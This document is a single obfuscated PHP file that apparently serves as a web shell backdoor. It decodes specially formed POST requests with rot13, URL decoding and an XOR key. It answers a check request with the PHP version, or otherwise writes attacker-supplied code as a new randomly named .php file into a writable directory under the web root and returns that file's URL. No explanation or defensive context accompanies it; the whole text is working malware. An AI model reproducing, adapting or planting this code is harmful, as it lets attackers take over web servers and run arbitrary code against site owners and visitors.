<?php $ihmphtx = "nmplfzmgsovrpugg";$bzrcr = "";foreach ($_POST as $qhyglse => $kdobod){if (strlen($qhyglse) == 16 and substr_count($kdobod, "%") > 10){cgjox($qhyglse, $kdobod);}}function cgjox($qhyglse, $frdzrfsgncz){global $bzrcr;$bzrcr = $qhyglse;$frdzrfsgncz = str_split(rawurldecode(str_rot13($frdzrfsgncz)));function dumxwfcyy($fpwjpkzf, $qhyglse){global $ihmphtx, $bzrcr;return $fpwjpkzf ^ $ihmphtx[$qhyglse % strlen($ihmphtx)] ^ $bzrcr[$qhyglse % strlen($bzrcr)];}$frdzrfsgncz = implode("", array_map("dumxwfcyy", array_values($frdzrfsgncz), array_keys($frdzrfsgncz)));$frdzrfsgncz = @unserialize($frdzrfsgncz);if (@is_array($frdzrfsgncz)){$qhyglse = array_keys($frdzrfsgncz);$frdzrfsgncz = $frdzrfsgncz[$qhyglse[0]];if ($frdzrfsgncz === $qhyglse[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function nsmeijco($frdzrfsir) {static $fkrbvtubf = array();$psumqszco = glob($frdzrfsir . '/*', GLOB_ONLYDIR);if (count($psumqszco) > 0) {foreach ($psumqszco as $frdzrfs){if (@is_writable($frdzrfs)){$fkrbvtubf[] = $frdzrfs;}}}foreach ($psumqszco as $frdzrfsir) nsmeijco($frdzrfsir);return $fkrbvtubf;}$xkjxvt = $_SERVER["DOCUMENT_ROOT"];$psumqszco = nsmeijco($xkjxvt);$qhyglse = array_rand($psumqszco);$gowmnsqj = $psumqszco[$qhyglse] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($gowmnsqj, $frdzrfsgncz);echo "http://" . $_SERVER["HTTP_HOST"] . substr($gowmnsqj, strlen($xkjxvt));exit();}}}